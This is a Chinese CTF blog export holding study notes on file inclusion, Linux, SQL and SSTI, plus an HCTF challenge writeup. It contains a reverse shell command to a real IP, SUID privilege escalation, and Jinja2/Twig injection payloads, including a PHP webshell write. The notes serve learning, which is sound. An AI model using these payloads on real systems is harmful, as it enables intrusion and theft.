文件：通过Session变量写入恶意代码，然后找到路径，包含这个文件，执行命令。\n5、包含日志文件：通过构造语句让服务器报错并将一句话随报错信息写入日志，然后找到日志文件路径，包含此文件，用工具连接，拿下网站的Webshell\n远程文件包含条件1、allow_url_include&#x3D;On\n2、有动态变量可以控制\n方法1、远程包含其他服务器上配置好的恶意文件：在我们可以控制的服务器上提前配置好一个我们想要的恶意文件，将文件在服务器下的路径作为参数传进去，目标服务器接收到之后就会自动下载并执行这个恶意文件。\n2、使用协议包装：使用php:&#x2F;&#x2F;input然后发送post请求、data:&#x2F;&#x2F;数据流等直接包含恶意代码进去。\n相关知识点常见日志路径/var/log/apache2/access.log/var/log/nginx/access.log  /var/log/httpd/access_log\n\n常见session文件路径/var/lib/php/sessions/sess_[PHPSESSID]/var/lib/php5/sessions/sess_[PHPSESSID] /tmp/sess_[PHPSESSID]/var/lib/php7.4/sessions/sess_[PHPSESSID]\n\n","categories":["CTF"],"tags":["web","note"]},{"title":"Linux学习笔记","url":"/2025/11/09/Linux/","content":"shell命令解释器&#x2F;一种强大的脚本语言\nBourne Shell(sh)Unix 系统上最初的、也是最主要的 Shell。\n主要用途：\nUnix shell 脚本的事实标准；在现代 Linux 系统中，/bin/sh 通常已经是一个指向其他 Shell（如 bash 或 dash）的符号链接，但为了保持兼容性，它会运行在一种尽可能模拟原始 Bourne Shell 的模式下。\nBourne-Again Shell(bash)主要用途：\n交互式使用：绝大多数 Linux 发行版的默认 Shell 都是 bash，它提供了如命令历史、命令补全、作业控制、丰富的配置选项（~&#x2F;.bashrc 文件）等功能；\n脚本编写：它完全兼容 Bourne Shell 脚本，并进行了大量扩展，功能非常强大。是目前编写复杂脚本最流行的选择之一。\n(命令历史：上下键操作，在终端中输入 history，会列出所有记录的历史命令，每条命令前面有一个编号，输入!编号可以再次执行指定历史命令，也可以Ctrl+R输入命令片段进行搜索，然后回车执行，Ctrl+C取消搜索，history -c可以清除当前会话的历史记录。\n作业控制：Ctrl+Z暂停当前进程挂入后台，jobs列出后台所有进程，fg  %作业编号将后台指定进程挂入前台，bg  %作业编号恢复指定进程在后台运行，在命令后加&amp;可让进程直接在后台启动运行。\n~&#x2F;.bashrc 文件：可以为命令设置别名（alias 指定字符&#x3D;指定命令），通过修改变量 PS1来改变终端提示符的样式，定义一些程序运行所需要的环境变量，定义自定义函数，修改完毕后重新打开一个终端窗口或者使用命令source ~&#x2F;.bashrc；可简写为 . ~&#x2F;.bashrc。)\nC Shell(csh)主要用途：\n交互式使用：首次引入了很多如命令历史、别名等交互特性。其语法设计模仿 C 语言，对熟悉 C 的程序员来说更直观。\nTenex C Shell(tcsh)csh增强版，在 csh 的基础上增加了更强大的命令行补全、命令行编辑等功能。\nKorn Shell(ksh)主要用途：\n交互式使用：bash 流行之前，ksh 因其出色的交互体验和脚本性能而备受青睐，尤其是在商业 Unix 系统（如 AIX、HP-UX）中。\n脚本编写：引入了很多先进的编程特性，如关联数组、浮点数运算等，这些特性后来也被 bash 借鉴。\nZ Shell(zsh)bash, ksh, tcsh 等特性的集大成者。\n主要用途：\n交互式使用：提供了开箱即用，十分强大的功能，如智能补全、主题支持、拼写纠正、全局别名等。\n框架支持：Oh My Zsh 等配置框架的出现，让配置和管理 zsh 变得异常简单和强大。\n基本操作按键操作终端：\nCtrl+Alt+F1~F6：六个虚拟控制台切换\nCtrl+Alt+F7：切换图形桌面界面\nCtrl+Alt+T：在图形界面中打开控制台\n命令行编辑\nCtrl + A：将光标移动到行首\nCtrl + E：将光标移动到行尾\nCtrl + U：删除从光标位置到行首的所有内容\nCtrl + K：删除从光标位置到行尾的所有内容\nCtrl + W：删除光标前的一个单词\nCtrl +Y：粘贴刚才用 Ctrl+U&#x2F;K&#x2F;W 删除的内容\nCtrl + L：清屏\n进程控制\nCtrl+C：强制终止正在运行的命令\nCtrl+Z：暂停当前进程并放入后台\nCtrl+D：发送中止信号，在空行中会退出当前终端会话，在程序中是输入结束\n图形界面窗口管理\nAlt+Tab：程序窗口切换\nAlt+F4：关闭当前窗口\nAlt + F7：（或按住Alt拖动窗口）移动窗口\nAlt + F8：调整窗口大小\nSuper（Windows 键）：打开活动概述或应用程序菜单\n桌面操作（Super&#x3D;Win&#x3D;Command)\nSuper + D：显示桌面（最小化所有窗口）\nSuper + L：锁屏\nPrintScreen：截取整个屏幕\nAlt + PrintScreen：截取当前窗口\nnano文本编辑器操作\nCtrl + O：保存文件\nCtrl + X：退出\nCtrl + K：剪切行\nCtrl + U：粘贴\n其他系统快捷键\nCtrl + Alt + Delete：在 Linux 中通常会打开注销&#x2F;关机菜单\nCtrl + Alt + Esc：在某些桌面环境中，可以让鼠标指针变成”X”形，点击崩溃的窗口来强制关闭它\n基础命令文件和目录操作ls：查看目录下所有信息\n-a    显示所有文件（包括 . 隐藏文件）-l    以列表长格式显示ls列出的信息-h    更直观的展现，显示文件大小（通常与l一起用）---------------------------------------------------------------------------------------------r    倒序列出ls查看信息-t    以时间顺序列出文件信息（最新的在前边）-d    只列出目录-R    递归显示目录中的所有文件以及子文件（文件包含的文件）\n\ncd：切换目录\ncd\t\t返回到home家目录cd ~\t~后不加东西返回home家目录，加东西切换到指定用户的家目录cd .\t当前目录   cd ..\t上一级目录cd -\t切换到上一个工作目录\n\ntouch：创建文件\ntouch 文件名\t\t  创建指定名字文件touch 已存在文件名\t修改时间\n\nmkdir：创建文件夹\nmkdir\t\t创建单级文件夹，文件夹重名报错mkdir\t-p\t创建多级文件夹，文件夹重名也可创建，不报错\n\nrm：删除文件或目录\n-r\t删除目录-f\t强制删除\n\ncp：复制文件或目录\n-r\t移动文件夹-p\t复制时保留源文件的权限、所有者和时间戳信息-d\t复制时保留链接。这里所说的链接相当于 Windows 系统中的快捷方式。\n\nmv：移动文件或文件夹\nmv 原路径 新路径\t移动文件或文件夹到指定路径下mv /ab/c /ab/c1 这种重复会将c文件夹重命名为c1，文件同理\n\ndu：显示文件或目录磁盘使用情况\n-s\t显示指定文件或目录的总磁盘使用量（单位是KB)-h\t以易读的形式展现（显示大小M）-sh\t查看磁盘使用情况\n\nln：创建链接\nln -s 源文件 链接后的文件\t软链接（符号链接）ln  源文件 链接后的文件\t\t硬链接\n\necho：打印文本\necho 内容\t\t\t 打印指定文本echo 内容 &gt;文件\t\t写入指定文件\n\n文件查看cat：刷屏的形式显示文件内容\nmore：分页查看\n空格键          向下翻一页回车键          向下翻一行b              向上翻一页（有限制）/关键词         搜索q              退出=              显示当前行号\n\nless：分页查看\n空格键 或 f       向下翻一页b               向上翻一页回车键 或 ↓      向下翻一行↑               向上翻一行/关键词          向前搜索?关键词          向后搜索n               跳转到下一个匹配项N               跳转到上一个匹配项q               退出g               跳到文件开头G               跳到文件末尾:数字            跳到指定行号\n\nhead：从头开始查看\n-n   n表示查看几行\n\ntail：从尾部开始查看\n-n   n表示查看几行\n\n文件搜索和查询find：查找文件或命令\nfind [路径] [参数选项] -name　　\t按照文件名查找文件。        -perm 　　按照文件权限来查找文件。 　　　　　　　　-prune　　可以使find命令不在当前指定的目录中查找，如果同时使用-depth选项，那么-prune将被find命令忽略。 例如：　　find /apps -path &quot;/apps/bin&quot; -prune　　在/apps目录下查找文件，但不希望在/apps/bin目录下查找-user　　\t按照文件所有者来查找文件-group　　按照文件所属的组来查找文件-mtime　　按照文件的更改时间来查找文件-type　　\t按照文件类型查找　　　　　　　　b - 块设备文件　　　　　　　　d - 目录 　　　　　　　　c - 字符设备文件　　　　　　　　p - 管道文件　　　　　　　　l - 符号链接文件 　　　　　　　　f - 普通文件-size \t[+-]大小单位\t按文件大小搜索\n\ngrep：过滤—搜索 文件\ngrep [选项] &#x27;模式&#x27; 文件或目录-i\t忽略大小写-n\t显示行号-r\t递归搜索-v\t排除搜索\n\nlocate：数据库查找\nlocate 路径\n\n压缩和解压tar：解压缩文件\ntar [选项] [文件名] [要操作的文件/目录]-z：有gzip属性的 -j：有bz2属性的 -v：显示所有过程 -c: 建立压缩档案 -x：解压 -t：查看内容 -r：向压缩归档文件末尾追加文件 -u：更新原压缩包中的文件\n\n其他pwd：显示当前工作目录完整路径\nwho：显示当前登录用户\npasswd：修改密码\nchmod：修改文件或目录权限\nchmod 对象类别 操作符 权限 文件  / chmod 权限数字 文件对象类别：u：用户/所有者g：组o：其他人a：所有人操作符：+：添加权限-：删除权限=：精确赋予权限权限：r（4）：读w（2）：写x（1）：执行\n\nchown：修改文件或目录所有者（仅管理员可以使用）\nchown [选项] 用户名:组名 文件或目录可以只修改组或者所有者，也可以同时修改用户名和组也可以使用UID和GID：0为root用户（组）；1-999为系统用户（组）；1000-60000为普通用户（组）；65534为nobody用户-R：递归-v：详细显示-c：仅显示更改\n\nsetfacl：设置文件或目录的访问控制列表\nsetfacl 选项 条目类型:目标:权限 文件-m：修改/添加权限条目-x：删除权限条目-b：删除所有权限条目setfacl 选项 d:条目类型:目标:权限 目录d：设置默认权限（新建文件自动继承）\n\ngetfacl：查看ACL\ngetfacl 文件getfacl 目录/\n\nping：测试网络连通性\nifconfig：显示网络接口信息\nnetstat：显示网络状态信息\nwget：下载文件\nscp：在本地和远程主机之间复制文件\ncrul：\nsleep：睡眠\nlast：显示&#x2F;var&#x2F;log&#x2F;wtmp文件内容，用户登录历史及系统重启历史 \nlastb：显示&#x2F;var&#x2F;log&#x2F;btmp文件内容，用户错误的登录尝试\nlastlog：显示每个用户最近一次成功登录信息\n-u 用户名  显示特定用户最近的登录信息\n\nbasename：显示路径基名\nchattr：用于改变文件的特殊属性\nchattr [选项] [+/-/=属性] [文件或目录]选项：-R\t递归-V\t显示过程属性：+\t用于增加属性-\t用户删除属性=\t用于指定属性A\t告诉系统不要修改该文件的最后访问时间a\t//只能向文件追加数据，不能删除i\t//设定文件不能被删除，改名，写入或新增内容\n\n\n\n权限管理权限简介Linux权限是操作系统用来限制对资源访问的机制，权限一般分为读（r）、写（w）、执行（x）。系统中每个文件都拥有特定的权限：属主、属组以及其他人，通过这样的机制来限制哪些用户或用户组可以对特定文件进行相应的操作。\n权限分类\n\n\n属主\nowne\nu\n\n\n\n属组\ngroup\ng\n\n\n其他人\nother\no\n\n\n特殊权限SUID普通用户执行时以root身份运行\nSGID可执行文件：运行程序时，进程的组变成程序文件的所属组\n目录：在此目录中创建的文件，其所属组自动继承目录的组\nSticky在公共目录中，用户只能删除自己创建的文件，不能删除他人的文件\n遮罩码新建文件和新建目录的默认权限是由遮罩码umask来控制的，遮罩码通常用来隐藏一些权限\n文件最高权限 - 遮罩码 = 文件最终权限目录最高权限 - 遮罩码 = 目录最终权限setfacl -m m::最大权限 文件或目录\n\nSUDO借权作用临时提权：让普通用户临时以 root 或其他用户身份执行命令\n精细控制：可以控制用户能执行哪些命令、以谁的身份执行\n审计追踪：所有 sudo 操作都会被记录\n本质通过visudo 编辑配置文件 /etc/sudoers 定义用户可执行的命令范围\n命令sudo [选项] [要借用的身份] 命令 [命令的参数]选项-V    显示版本编号-h    帮助信息，会显示版本编号及指令的使用方式说明-l    列出当前用户可以使用的所有sudo类命令-v    重新做一次密码确认，如果超过N（默认为5）分钟，也会问密码-k    立刻清除认证信息，如果不指定-k，默认认证信息在5分钟后失效-b    将要执行的指令放在后台执行\n\n进程管理基本介绍1.在 LINUX 中，每个执行的程序（代码）都称为一个进程。每一个进程都分配一个 ID 号2.每一个进程，都会对应一个父进程，而这个父进程可以复制多个子进程3.每个进程都可能以两种方式存在的。前台与后台，所谓前台进程就是用户目前的屏幕上可以进行操作的。后台进程则是实际在操作，但由于屏幕上无法看到的进程，通常使用后台方式执行4.一般系统的服务都是以后台进程的方式存在，而且都会常驻在系统中。直到关机才才结束\n\n查看进程查看进行使用的指令是     ps ,一般来说使用的参数是 ps -aux,ps -ef,正常与grep连用\n-aux\t查看所有进程详细信息-ef\t\t另一种格式查看所有进程-ejH\t显示进程层次关系auxf\t显示进程树结构pstree\t专门的进程树命令aux | grep 进程名  查找特定进程\n\nstat\t\t\t进程状态\tS:睡眠\ts:会话的先导进程\tN:进程拥有比普通优先级更低的优先级\tR:正在运行\tD:短期等待\tZ:僵尸进程\tT:被跟踪或者被停止command\t\t\t启动进程所用的命令和参数，如果过长会被截断显示\n\n![img](file:&#x2F;&#x2F;&#x2F;C:\\Users\\wsad\\Documents\\Tencent Files\\1926640039\\nt_qq\\nt_data\\Pic\\2025-11\\Ori\\d922bef94804f882d5073810044606b6.png)\npid\t\t\t\t进程idppid\t\t\t父进程idC\t\t\t\t进程占cpu百分比\n\n\n结束进程kill 进程号     \t停止进程kill-9 进程号   \t强迫进程立即停止killall 进程名称\t停止所有相同的进程名称\n\n动态进程监控top命令与ps命令都用于查看进程，但是top命令可以隔一段时间更新进程状态\ntop [选项]\t-d\t\t\t指定每隔几秒更新,默认3秒\t-i\t\t\t不显示任何闲置或者僵尸进程\t-p id号\t\t监听指定进程交互操作:P\t\t以cpu使用率排序,默认就这个M\t\t以内存使用率排序N\t\t以pid排序u\t\t监听具体用户k\t\t终止指定进程q\t\t退出top\n\n文件系统分类磁盘文件系统：NTFS,EXT3\n闪存文件系统：JFFS2,YAFFS\n数据库文件系统：BFFS,WINFS\n网络文件系统：NFS\n虚拟文件系统：VFS（Proc）\n用于内存交换的特殊文件系统：swap（其实现的方式有以下两种：第一种是进行内存排列像内存池一样，进行优化；第二种是把硬盘上的空间模拟成内存。）\n不同颜色对应文件蓝色：目录文件 绿色：可执行文件 浅蓝色：链接文件 红色：压缩文件 灰色：其他文件\n系统函数1、systemsystem()是封装最彻底的函数，核心特点是简单易用，无需关注进程细节，但灵活性最差。\n核心逻辑：\nsystem(command)→fork()子进程 → 子进程中execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, command, NULL)→ 父进程waitpid()等待。\n\n局限性：\n无法直接获取命令输出（需重定向到文件）。依赖 `/bin/sh`（部分嵌入式系统可能没有）。安全性较低：若 `command` 包含用户输入，易引发命令注入（如 `system(&quot;ls &quot; + user_input)`）。\n\n2、exec系列exec直接替换当前进程，不返回，无内置等待机制，需手动配合 fork（创建子进程）+ waitpid（等待子进程结束），支持自定义环境变量、参数动态传递，适合复杂命令场景。\n\n\n\n函数名\n核心特点\n示例\n\n\n\nexecl\n参数列表传递（以空指针 (char*)NULL 结尾）\nexecl(&quot;/bin/ls&quot;, &quot;ls&quot;, &quot;-la&quot;, NULL);\n\n\nexeclp\n自动从 PATH 环境变量查找命令\nexeclp(&quot;ls&quot;, &quot;ls&quot;, &quot;-la&quot;, NULL);\n\n\nexecle\n带环境变量（最后一个参数是自定义环境数组）\nchar* env[] = {&quot;PATH=/bin&quot;, NULL}; execle(&quot;ls&quot;, &quot;ls&quot;, &quot;-la&quot;, NULL, env)\n\n\nexecv\n参数数组传递（适合参数数量不确定场景）\nchar* args[] = {&quot;ls&quot;, &quot;-la&quot;, NULL}; execv(&quot;/bin/ls&quot;, args);\n\n\nexecvp\n路径自动查找 + 参数数组传递（最常用）\nchar* args[] = {&quot;ls&quot;, &quot;-la&quot;, NULL}; execvp(&quot;ls&quot;, args);\n\n\nexecvpe\n路径查找 + 参数数组 + 自定义环境变量\nchar* args[] = {&quot;ls&quot;, &quot;-la&quot;, NULL}; char* env[] = {&quot;PATH=/bin&quot;, NULL}; execvpe(&quot;ls&quot;, args, env);\n\n\n3、popen() + pclose()库函数，带 IO 管道交互；popen()是封装后的库函数，核心优势是创建管道与子进程通信，能直接读取命令输出或向命令写入输入（比 system()多了 IO 交互能力，但只能单向）；pclose()会等待子进程结束，自动回收资源，避免僵尸进程。\n底层逻辑：\nfork子进程 + exec执行命令 + 创建匿名管道（单向通信）。\n\n支持两种模式：\n读模式（&quot;r&quot;）：读取命令的标准输出（如 ls -la 的结果）。写模式（&quot;w&quot;）：向命令的标准输入传递数据（如向 grep 传递内容）。\n\n4、fork() +execsystem()的底层实现就是fork()+ exec()+waitpid()，手动组合这三个函数能完全控制进程创建、命令执行、资源回收的全流程。\n核心逻辑：\n1、fork()：创建子进程（父进程返回子进程PID，子进程返回0）。2、子进程中调用exec执行命令（替换子进程映像）。3、父进程用waitpid()等待子进程结束，获取退出状态，回收资源\n\n5、posix_spawn()posix_spawn()是POSIX标准的库函数，专门用于高效创建并执行新进程，底层优化了上下文切换，比fork+exec更节省资源（适合嵌入式、高性能场景）。\n核心特点:\n1、无需手动fork，直接创建子进程并执行命令，一步完成。2、支持传递参数、环境变量、文件描述符控制（如重定向stdin/stdout）。3、兼容性好，跨POSIX系统（Linux、Unix、macOS）通用。","categories":["CTF"],"tags":["web","note"]},{"title":"HCTF 招新赛游戏题 Wp","url":"/2025/12/03/HCTF-Game-Wp/","content":"1、打开题目，游戏题先看源代码\n\n2、源代码中有game.js文件，进入查看，搜索score无果后，在最底部找到了.swp文件的提示，尝试.index.php.swp得到文件\n\n3、在文件中得到下一个地址&#x2F;Nr.php\n\n4、进入看到代码，分析代码后发现这里使用的是shell_exec函数，shell_exec函数需要主动输出，这里显然没有，而且题目提示真正的flag在root目录之下，我们还需要获取root权限才行，但这里又限制掉了find和一些常用的如cat、tac、nl等函数，所以我们选择反弹shell\n\n\n5、我们用tabby连接云服务器，输入nc -lvp 2333对2333端口进行监听，然后传参cmd&#x3D;nc -e &#x2F;bin&#x2F;sh 101.200.30.203 2333\n\n\n6、提权的方式在前面的提示中已经告诉我们了，需要使用SUID进行提权，于是我们对带相应权限的文件进行搜索\n\n7、我们选用find文件进行提权；使用find &#x2F;usr&#x2F;bin&#x2F;find -exec &#x2F;bin&#x2F;sh -p ;命令\n\n8、whoami检查权限为root之后，直接ls &#x2F;root，发现flag之后用tac &#x2F;root&#x2F;flag进行读取\n\n\n\n知识点1、find &#x2F;usr&#x2F;bin&#x2F;find -exec &#x2F;bin&#x2F;sh -p ;命令解释find /usr/bin/find：\t寻找find这个文件-exec：\t\t\t\t当find找到符合条件的文件时，执行指定的命令/bin/sh：\t\t\t承接高权限程序（如带SUID的find）的权限，生成高权限shell-p：\t\t\t\t\t继承保持这个权限\n\n2、.swp.swp文件是 Vim 编辑器生成的临时交换文件，用于在编辑过程中临时保存文件内容，防止意外中断导致未保存的修改丢失；常以.开头用于隐藏文件\n3、shell_exec函数PHP 中用于执行系统命令并获取输出的内置函数，但是与system不同，它需要手动echo才有输出\n4、whoami显示当前执行命令的用户身份\n5、SUID允许普通用户执行某文件时，临时获得该文件所有者的权限，在提权操作很常见\n6、find -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null命令解释-perm：\t\t按照权限筛选文件-u=s：\t\tu代表文件所有者，s代表 SUID 权限，整体意思是 “必须包含所有者的 SUID 权限”-type：\t\t按照文件类型筛选文件f：\t\t\t代表file普通文件2&gt;/dev/null：2代表错误输出，/dev/null是一个文件黑洞，用于丢弃放入这里的的文件\n\n7、nc命令格式：nc [选项] [目标IP] [端口]\n选项：\n-l：监听模式（作为服务器，等待连接）；-p：指定本地端口（配合 -l 使用）；-e：执行命令（连接建立后，将本地 Shell 绑定到连接，常用于反弹 Shell）；-n：不进行 DNS 解析（直接用 IP，加快速度）；-v：显示详细输出（调试用）；-z：扫描模式（不发送数据，仅检测端口是否开放）。\n\n","categories":["CTF"],"tags":["web","wp","note"]},{"title":"SQL注入学习笔记","url":"/2025/11/24/SQL/","content":"什么是SQLSQL 指结构化查询语言，全称是 Structured Query Language。SQL 让您可以访问和处理数据库，包括数据插入、查询、更新和删除。SQL 语言采用英语关键词，使其易读易写。SQL 由国际标准化组织（ISO）和美国国家标准协会（ANSI）标准化。SQL 提供了丰富的操作数据的功能，从简单的查询到复杂的数据库管理操作。\n\nSQL能干什么SQL 面向数据库执行查询SQL 可从数据库取回数据SQL 可在数据库中插入新的记录SQL 可更新数据库中的数据SQL 可从数据库删除记录SQL 可创建新数据库SQL 可在数据库中创建新表SQL 可在数据库中创建存储过程SQL 可在数据库中创建视图SQL 可以设置表、存储过程和视图的权限\n\nSQL关键字SELECT用于从数据库中查询数据\nSELECT column_name FROM table_name WHERE conditioncolumn_name：列名table_name：表名condition：查询条件\n\nWHERE用于指定筛选条件\nSELECT column_name FROM table_name WHERE condition\n\nINSERT INTO用于向数据库表中插入新数据\nINSERT INTO table_name (column1, column2, ...) VALUES (value1, value2, ...)column：列value：对应列的值。\n\nUPDATE用于更新数据库表中的现有数据\nUPDATE table_name SET column1 = value1, column2 = value2, ... WHERE condition\n\nDELETE用于从数据库表中删除数据。\nDELETE FROM table_name WHERE condition\n\nCREATE TABLE用于创建新的数据库表\nCREATE TABLE table_name (column1 data_type constraint, column2 data_type constraint, ...)data_type: 列的数据类型（如 INT、VARCHAR 等）。constraint: 列的约束（如 PRIMARY KEY、NOT NULL 等）。\n\nALTER TABLE用于修改现有数据库表的结构\nALTER TABLE table_name ADD column_name data_type或：ALTER TABLE table_name DROP COLUMN column_name\n\nDROP TABLE用于删除数据库表\nDROP TABLE table_name\n\nCREATE INDEX用于创建索引，以加快查询速度\nCREATE INDEX index_name ON table_name (column_name)index_name：索引的名称\n\nDROP INDEX用于删除索引\nDROP INDEX index_name ON table_name\n\nORDER BY用于对结果集进行排序\nSELECT column_name(s) FROM table_name ORDER BY column_name [ASC|DESC]ASC: 升序（默认）。DESC: 降序。\n\nGROUP BY用于将结果集按一列或多列进行分组\nSELECT column_name(s), aggregate_function(column_name) FROM table_name WHERE condition GROUP BY column_name(s)\n\nGROUP_CONCAT将一个分组内指定列的所有值连接成一个单一的字符串\nSELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database()\n\nHAVING用于对分组后的结果集进行筛选。\nSELECT column_name(s), aggregate_function(column_name) FROM table_name GROUP BY column_name(s) HAVING condition\n\nJOIN用于将两个或多个表的记录结合起来。\nSELECT column_name(s) FROM table_name1 JOIN table_name2 ON table_name1.column_name = table_name2.column_nameJOIN: 可以是 INNER JOIN、LEFT JOIN、RIGHT JOIN 或 FULL JOIN。\n\nDISTINCT用于返回唯一不同的值。\nSELECT DISTINCT column_name(s) FROM table_name","categories":["CTF"],"tags":["web","note"]},{"title":"SSTI学习笔记","url":"/2025/11/10/SSTI/","content":"漏洞成因当用户的输入被直接拼接进模板，并且未经严格过滤就被渲染时，如果用户输入包含了模板语法，该语法就会被执行，从而导致SSTI漏洞。\n常见模板Jinja2 (Python)：常使用49探测是否有ssti漏洞\nTwig (PHP)：与Jinja2相同\nSmarty (PHP)：常使用{7*7}探测是否有ssti漏洞\n语句包裹符号Jinja2 &#x2F;Twig&#123;&#123; &#125;&#125;\t\t\t\t包裹变量/输出语法&#123;% %&#125;\t\t\t\t包裹控制语句，&#123;% endif %&#125;和&#123;% endfor %&#125;是if和for语句的结束符&#123;#  #&#125;\t\t\t\t包裹注释&#123;&#123; name|upper &#125;&#125;\t过滤\n\nSmarty&#123;$变量名&#125;或&lt;%变量名%&gt;\t\t\t包裹变量&lt;&#123;  &#125;&gt;\t\t\t\t\t\t包裹控制语句&#123;*  *&#125;\t\t\t\t\t\t注释&#123; &#125;\t\t\t\t\t\t\t标签界定符，中间默认为smarty语法，会被解析执行\n\n注入Jinja21、获取配置信息&#123;&#123;config&#125;&#125;\t\t\t\t输出所有配置信息&#123;&#123;config.items()&#125;&#125;\t\t列表形式输出配置信息&#123;&#123;config.SECERT_KEY&#125;&#125;\t精准输出指定配置信息\n\n2、获取信息用python内置的各种模块及里面的函数来获取需要的信息，比如flag的位置。\n常用模块：os\t\t\t与操作系统交互，获取系统环境变量、执行系统命令、操作文件路径等sys\t\t\t获取 Python 解释器相关信息，以及与程序运行时环境交互常用模块下的函数：osos.environ：\t\t\t获取系统环境变量os.getcwd()：\t\t获取当前工作目录os.listdir(path)：\t列出指定目录下的文件和文件夹os.popen(command)：\t执行系统命令并获取输出，常与.read()搭配使用syssys.version\t\t\t获取 Python 版本sys.platform\t\t获取操作系统平台sys.argv\t\t\t获取命令行参数sys.argv[0]\t\t\t显示脚本绝对路径sys.modules\t\t\t获取当前已加载的模块列表（用于寻找可用模块绕过过滤）常用的内置函数:range()\t\t\t\t\t\t\t\t\t生成一个整数序列，常用于循环__import__()\t\t\t\t\t\t\t动态导入 Python 模块open().read()\t\t\t\t\t\t\t读取文件内容eval()\t\t\t\t\t\t\t\t\t执行一个 Python 表达式exec()\t\t\t\t\t\t\t\t\t执行动态生成的 Python 代码块__class__, __bases__, __subclasses__()\t遍历 Python 的类继承树，寻找可利用的类getattr()\t\t\t\t\t\t\t\t通过字符串名称获取对象的属性或方法，可以绕过对特定方法名的过滤\n\n3、过滤绕过字符串拼接&#123;&#123; __import__(&#x27;o&#x27;+&#x27;s&#x27;).popen(&#x27;whoami&#x27;).read() &#125;&#125;\t‘+’拼接&#123;&#123; __import__(&#x27;os&#x27;[:2]).popen(&#x27;whoami&#x27;).read() &#125;&#125;\t[:2]取引号中前两个字符&#123;&#123; __import__(&#x27;so&#x27;[::-1]).popen(&#x27;pwd&#x27;).read() &#125;&#125;\t[::-1]将引号中的字符进行反转编码绕过&#123;&#123; __import__(&#x27;base64&#x27;).b64decode(&#x27;b3M=&#x27;).decode() &#125;&#125;  # 解码为 os用 include/import 导入恶意模板&#123;&#123; include(&#x27;恶意模板&#x27;) &#125;&#125;\t\t若恶意模板可控，可注入代码&#123;&#123; import(&#x27;恶意模块&#x27;).func() &#125;&#125;\t导入恶意模块执行函数，func代指恶意模块中的一个函数或者宏的命名利用循环/条件语句构造 payload&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == &#x27;Popen&#x27; %&#125;&#123;&#123; c(&#x27;whoami&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;遍历所有子类，寻找Popen，利用其执行命令whoami并借助read()输出结果\n\n4、沙箱逃逸思路：获取object基类：通过已知对象（如字符串、列表）的__class__和__mro__属性获取。列出所有子类：通过__subclasses__()方法获取所有子类。寻找有用的类：如catch_warnings、_wrap_close、Popen等。利用找到的类：通过类的__globals__、__init__等属性获取模块和内置函数。执行代码或命令：通过导入模块或调用函数执行系统命令。\n\nTwig1、确定方式在&#123;&#123;7*7&#125;&#125;确定是Jianja2和Twig其中之一后，可以使用Twig的特有语法来确定，比如：&#123;&#123;_self&#125;&#125;                输出Twig对象信息&#123;&#123;dump(_self)&#125;&#125;          尝试dump函数&#123;&#123;app&#125;&#125;                  检查Symfony环境&#123;&#123;_self.env&#125;&#125;            输出Twig环境对象 &#123;&#123;app&#125;&#125;                  检查Symfony环境，输出应用对象&#123;&#123;this&#125;&#125;                 其他框架的当前对象&#123;&#123;&#125;&#125;                     触发Twig语法错误&#123;&#123; unknown_variable &#125;&#125;   查看错误信息特征\n\n2、获取信息获取信息就是寻找可以注入并执行命令的变量，比如\n包含可以执行命令的方法的对象，如app、request、system可以用于文件读取的对象，如file_system、storage可以用于代码执行的对象，如evaluator、serializer\n\n获取变量的方式：获取环境信息1、&#123;&#123; _self.env &#125;&#125;\t-Twig环境信息2、&#123;&#123; app.request.server.all|join(&#x27;, &#x27;) &#125;&#125; -服务器环境变量3、&#123;&#123; phpversion() &#125;&#125; -PHP版本信息获取所有变量1、&#123;% for key, value in _context %&#125;&#123;&#123; key &#125;&#125;: &#123;&#123; value &#125;&#125;&#123;% endfor %&#125;2、&#123;&#123; _context|json_encode &#125;&#125;查看对象属性&#123;% for prop in app|properties %&#125;&#123;&#123; prop &#125;&#125;: &#123;&#123; attribute(app, prop) &#125;&#125;&#123;% endfor %&#125;查看对象方法&#123;% for method in app|methods %&#125;&#123;&#123; method &#125;&#125;&#123;% if method starts with &#x27;get&#x27; %&#125;结果: &#123;&#123; attribute(app, method) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n\n3、命令注入在搜集完变量之后，寻找其中的可用路径，执行各类命令进行深入挖掘\n一、命令注入1、使用过滤器：原理：当 Twig 的某些过滤器（如 filter, map, reduce）在寻找回调函数时，如果发现你传递的不是一个已定义的 Twig 函数，它会尝试将这个字符串当作一个PHP 原生函数名来调用\n（1）、使用system过滤器&#123;&#123;[&#x27;id&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;（2）、使用map过滤器&#123;&#123;[&#x27;cat /etc/passwd&#x27;]|map(&#x27;system&#x27;)|join&#125;&#125;（3）、使用reduce过滤器&#123;&#123;[0,0]|reduce(&#x27;system&#x27;,&#x27;whoami&#x27;)&#125;&#125;\n\n2、直接PHP函数调用：\n&#123;&#123;system(&#x27;id&#x27;)&#125;&#125;&#123;&#123;passthru(&#x27;ls -la&#x27;)&#125;&#125;&#123;&#123;shell_exec(&#x27;whoami&#x27;)&#125;&#125;&#123;&#123;phpinfo()&#125;&#125;\n\n3、使用函数执行命令\n（1）、eval（）&#123;&#123;eval(&#x27;system(&quot;id&quot;);&#x27;)&#125;&#125;（2）assert（）assert 是一个 PHP 内置函数，它的主要作用是检查一个表达式是否为 true。如果表达式为 false，它会触发一个断言错误，然而，在特定的 PHP 版本和配置下，assert 可以执行任意代码&#123;&#123;assert(&#x27;system(&quot;whoami&quot;)&#x27;)&#125;&#125;\n\n二、文件操作1、文件读取\n&#123;&#123;file_get_contents(&#x27;&#x27;)&#125;&#125;&#123;&#123;readfile(&#x27;&#x27;)&#125;&#125;&#123;&#123;file(&#x27;&#x27;)|join&#125;&#125;\n\n2、使用PHP包装器绕过限制\n&#123;&#123;file_get_contents(&#x27;php://filter/convert.base64-encode/resource=/etc/passwd&#x27;)&#125;&#125;\n\n3、文件写入\n&#123;&#123;file_put_contents(&#x27;shell.php&#x27;, &#x27;&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;&#x27;)&#125;&#125;\n\n4、目录遍历\n&#123;&#123;scandir(&#x27;/&#x27;)|join(&#x27;, 